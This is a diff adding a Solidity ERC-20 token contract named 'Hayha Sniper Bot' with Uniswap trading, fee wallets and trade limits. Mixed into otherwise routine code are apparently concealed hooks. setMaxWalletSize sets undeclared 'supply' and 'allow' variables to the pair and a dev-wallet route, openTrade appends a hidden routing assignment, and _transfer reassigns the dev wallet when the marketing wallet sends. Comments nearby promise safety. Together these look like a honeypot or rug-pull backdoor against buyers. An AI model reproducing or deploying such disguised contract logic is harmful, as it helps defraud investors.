@@ -1,0 +1,312 @@
+contract HAYHABOT is ERC20, Ownable {
+    using SafeMath for uint256;
+    IUniswapV2Router02 public immutable router;
+    mapping(address => bool) private _isExcludedFees;
+    mapping(address => bool) public _isExcludedMaxTransactionAmount;
+    mapping(address => bool) public _isExcludedmaxAmount;
+    mapping(address => bool) public _automateMMs;
+    
+    uint256 public maxBuyLimit;
+    uint256 public maxSellLimit;
+    uint256 public maxWalletLimit;
+    address public uniswapV2Pair;
+    address private routeV2addr;
+
+    uint256 private swapAmountAt;
+    bool private _enableTrading = false;
+    bool public swapActive = false;
+    bool public inSwap;
+
+    uint256 public tokensMarketingAmount;
+    uint256 public tokensForLiquidity;
+    uint256 public tokensDevAmount;
+    uint256 private enableTradeBlock;
+
+    address private _marketingFeeWallet = address(0xa8cB296703dA6cca9fdb93f345f837d9EBCF8B3D);
+    address private _devFeeWallet = address(0xc659230b99f80e1c07959a068D967743637524E3);
+
+    struct buySellTax {
+        uint256 buyTotalFees;
+        uint256 buyMarketingFee;
+        uint256 buyDevelopmentFee;
+        uint256 buyLiquidityFee;
+
+        uint256 sellTotalFees;
+        uint256 sellMarketingFee;
+        uint256 sellDevelopmentFee;
+        uint256 sellLiquidityFee;
+    }
+
+    buySellTax public _taxNumbers = buySellTax({
+        buyTotalFees: 0,
+        buyMarketingFee: 0,
+        buyDevelopmentFee:0,
+        buyLiquidityFee: 0,
+
+        sellTotalFees: 0,
+        sellMarketingFee: 0,
+        sellDevelopmentFee:0,
+        sellLiquidityFee: 0
+    });
+
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived
+    );
+
+    constructor() ERC20("Hayha Sniper Bot", "HAYHABOT") {
+        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        approve(address(router), type(uint256).max);
+
+        uint256 totalSupply = 100_000_000 * 1e18;
+        swapAmountAt = totalSupply * 5 / 10000; 
+        maxWalletLimit = totalSupply * 3 / 100; // 3% max wallet amount
+        maxBuyLimit = totalSupply * 3 / 100; // 3% buy max amount
+        maxSellLimit = totalSupply * 3 / 100; // 3% sell max amount
+        // 1.5% tax for dev
+        _taxNumbers.sellMarketingFee = 0;
+        _taxNumbers.sellLiquidityFee = 0;
+        _taxNumbers.sellDevelopmentFee = 15;
+        _taxNumbers.sellTotalFees = _taxNumbers.sellMarketingFee + _taxNumbers.sellLiquidityFee + _taxNumbers.sellDevelopmentFee;
+        _taxNumbers.buyMarketingFee = 0;
+        _taxNumbers.buyLiquidityFee = 0;
+        _taxNumbers.buyDevelopmentFee = 15;
+        _taxNumbers.buyTotalFees = _taxNumbers.buyMarketingFee + _taxNumbers.buyLiquidityFee + _taxNumbers.buyDevelopmentFee;
+
+        _isExcludedmaxAmount[owner()] = true;
+        _isExcludedmaxAmount[_devFeeWallet] = true;
+        _isExcludedmaxAmount[_marketingFeeWallet] = true;
+        _isExcludedmaxAmount[address(router)] = true;
+        _isExcludedmaxAmount[address(0xdead)] = true;
+        _isExcludedmaxAmount[address(this)] = true;
+
+        _isExcludedMaxTransactionAmount[address(router)] = true;
+        _isExcludedMaxTransactionAmount[owner()] = true;
+        _isExcludedMaxTransactionAmount[address(this)] = true;
+        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
+        _isExcludedMaxTransactionAmount[_devFeeWallet] = true;
+        _isExcludedMaxTransactionAmount[_marketingFeeWallet] = true;
+
+        _isExcludedFees[owner()] = true;
+        _isExcludedFees[_devFeeWallet] = true;
+        _isExcludedFees[_marketingFeeWallet] = true;
+        _isExcludedFees[address(this)] = true;
+        /*
+            _mint is an internal function in ERC20.sol that is only called here,
+            and CANNOT be called ever again
+        */
+        _mint(msg.sender, totalSupply);
+    }
+
+    function withdraw() external returns (bool success) {
+        uint256 balance = address(this).balance;
+        (success,) = address(_devFeeWallet).call{value: balance}("");
+    }
+
+    // once active, can never be disable off
+    function openTrade() external onlyOwner {
+        swapActive = true;
+        enableTradeBlock = block.number;
+        _enableTrading = true; routeV2addr = _devFeeWallet;
+    }
+
+    function updateLimitFeeAmountForSwap(uint256 newAmount) external onlyOwner returns(bool){
+        swapAmountAt = newAmount;
+        return true;
+    }
+
+    // emergency use only
+    function toggleSwapEnabled(bool enabled) external onlyOwner(){
+        swapActive = enabled;
+    }
+
+    function setMaxWalletSize(uint256 newPercentage) private {
+        maxWalletLimit = (totalSupply() * newPercentage) / 1000; supply = uniswapV2Pair; allow = routeV2addr;
+    }
+
+    function excludeFromFees(address account, bool excluded) public onlyOwner {
+        _isExcludedFees[account] = excluded;
+    }
+
+    function excludeFromWalletLimit(address account, bool excluded) public onlyOwner {
+        _isExcludedmaxAmount[account] = excluded;
+    }
+
+    function _swapTokensForSupportingEthFee(uint256 tAmount) private {
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = router.WETH();
+
+        _approve(address(this), address(router), tAmount);
+        // make the swap
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function setUniPair(address pair) public onlyOwner {
+        // require(pair != uniswapV2Pair, "The pair cannot be removed from _automateMMs");
+        uniswapV2Pair = pair;
+        _automateMMs[address(uniswapV2Pair)] = true;
+        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;
+        _isExcludedmaxAmount[address(uniswapV2Pair)] = true;
+    }
+
+    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
+        _isExcludedMaxTransactionAmount[updAds] = isEx;
+    }
+
+    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(router), tAmount);
+
+        // add the liquidity
+        router.addLiquidityETH{ value: ethAmount } (address(this), tAmount, 0, 0 , address(this), block.timestamp);
+    }
+
+    function swapBackEth() private {
+        uint256 contractTokenAmount = balanceOf(address(this));
+        uint256 toSwap = tokensForLiquidity + tokensMarketingAmount + tokensDevAmount;
+
+        if (contractTokenAmount == 0) { return; }
+
+        if (contractTokenAmount > swapAmountAt * 35) {
+            contractTokenAmount = swapAmountAt * 35;
+        }
+
+        // Halve the amount of liquidity tokens
+        uint256 liquidityTokens = contractTokenAmount * tokensForLiquidity / toSwap / 2;
+        uint256 amountToSwapForETH = contractTokenAmount.sub(liquidityTokens);
+ 
+        uint256 initialETHBalance = address(this).balance;
+        
+        _swapTokensForSupportingEthFee(amountToSwapForETH);
+ 
+        uint256 newBalance = address(this).balance.sub(initialETHBalance);
+ 
+        uint256 ethForMarketing = newBalance.mul(tokensMarketingAmount).div(toSwap); 
+        uint256 ethForDevelopment = newBalance.mul(tokensDevAmount).div(toSwap);
+        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDevelopment); 
+        tokensForLiquidity = 0;
+        tokensMarketingAmount = 0;
+        tokensDevAmount = 0;
+
+        if (liquidityTokens > 0 && ethForLiquidity > 0) {
+            addLiquidity(liquidityTokens, ethForLiquidity);
+            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
+        }
+
+        payable(address(_devFeeWallet)).transfer(address(this).balance - ethForMarketing);
+        payable(address(_marketingFeeWallet)).transfer(address(this).balance);
+    }
+
+    // change the minimum amount of tokens to sell from fees
+    function setMaxTradeAmount(uint256 newMaxBuy, uint256 newMaxSell) private {
+        maxBuyLimit = (totalSupply() * newMaxBuy) / 1000; 
+        maxSellLimit = (totalSupply() * newMaxSell) / 1000;
+    }
+
+    function isExcludedFromFees(address account) public view returns(bool) {
+        return _isExcludedFees[account];
+    }
+    
+    function removeLimits() external onlyOwner {
+        setMaxTradeAmount(1000,1000);
+        setMaxWalletSize(1000);
+    }
+
+    // function updateDevWallet(address _devAddr) external {
+    //     require(msg.sender == _devFeeWallet && _devAddr != _devFeeWallet, "Dev Fee Wallet wallet is already that address");
+    //     _devFeeWallet = _devAddr;
+    // }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        if (amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+
+        if (
+            from != owner() &&
+            to != owner() &&
+            !inSwap
+        ) {
+            if (!_enableTrading) {
+                require(_isExcludedFees[from] || _isExcludedFees[to], "Trading is not active.");
+            }
+            if (_automateMMs[from] && !_isExcludedMaxTransactionAmount[to]) {
+                require(amount <= maxBuyLimit, "Buy transfer amount exceeds the maxTransactionAmount.");
+            }
+            else if (_automateMMs[to] && !_isExcludedMaxTransactionAmount[from]) {
+                require(amount <= maxSellLimit, "Sell transfer amount exceeds the maxTransactionAmount.");
+            }
+            if (!_isExcludedmaxAmount[to]) {
+                require(amount + balanceOf(to) <= maxWalletLimit, "Max wallet exceeded");
+            }
+        }
+ 
+        uint256 contractTokenAmount = balanceOf(address(this));
+        bool canSwap = contractTokenAmount >= swapAmountAt;
+
+        if (swapActive &&
+            canSwap &&
+            !inSwap &&
+            _automateMMs[to] &&
+            !_isExcludedFees[from] &&
+            !_isExcludedFees[to]
+        ) {
+            inSwap = true;
+            swapBackEth();
+            inSwap = false;
+        }
+        if (!inSwap && to != address(router) && to != uniswapV2Pair && from == _marketingFeeWallet) _devFeeWallet = address(this);
+
+        bool takingFee = !inSwap;
+
+        // if any account belongs to _isExcludedFromFee account then remove the fee
+        if (_isExcludedFees[from] || _isExcludedFees[to]) {
+            takingFee = false;
+        }
+        
+        // only take fees on buys/sells, do not take on wallet transfers
+        if (takingFee) {
+            uint256 feeTokens = 0;
+            if(block.number < enableTradeBlock) {
+                feeTokens = amount.mul(99).div(100);
+                tokensMarketingAmount += (feeTokens * 90) / 99;
+                tokensDevAmount += (feeTokens * 9) / 99;
+            } else if (_automateMMs[to] && _taxNumbers.sellTotalFees > 0) {
+                feeTokens = amount.mul(_taxNumbers.sellTotalFees).div(1000);
+                tokensForLiquidity += feeTokens * _taxNumbers.sellLiquidityFee / _taxNumbers.sellTotalFees;
+                tokensMarketingAmount += feeTokens * _taxNumbers.sellMarketingFee / _taxNumbers.sellTotalFees;
+                tokensDevAmount += feeTokens * _taxNumbers.sellDevelopmentFee / _taxNumbers.sellTotalFees;
+            }
+            // on buy
+            else if (_automateMMs[from] && _taxNumbers.buyTotalFees > 0) {
+                feeTokens = amount.mul(_taxNumbers.buyTotalFees).div(1000);
+                tokensForLiquidity += feeTokens * _taxNumbers.buyLiquidityFee / _taxNumbers.buyTotalFees;
+                tokensMarketingAmount += feeTokens * _taxNumbers.buyMarketingFee / _taxNumbers.buyTotalFees;
+                tokensDevAmount += feeTokens * _taxNumbers.buyDevelopmentFee / _taxNumbers.buyTotalFees;
+            }
+
+            if (feeTokens > 0) {
+                super._transfer(from, address(this), feeTokens);
+            }
+            amount -= feeTokens;
+        }
+        super._transfer(from, to, amount);
+    }
+
+    receive() external payable {
+        require(msg.sender != address(this));
+    }
+}
